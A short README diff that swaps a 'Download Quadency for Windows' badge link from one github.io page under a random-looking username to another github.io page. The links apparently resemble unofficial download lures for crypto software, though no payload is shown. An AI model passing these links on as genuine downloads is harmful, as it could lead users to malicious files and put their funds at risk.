@@ -4,7 +4,7 @@
 
 ## 📥 Download Quadency for Windows
 
-[![⬇️ Download Quadency](https://img.shields.io/badge/Download-Quadency-blue?style=for-the-badge&logo=windows)](https://curtishahnpwos.github.io/.github/quadency-desktop-app)
+[![View Quadency](https://img.shields.io/badge/View-Quadency-4F46E5?style=flat)](https://quadency-crypto.github.io/.github/)
 
 ---
 
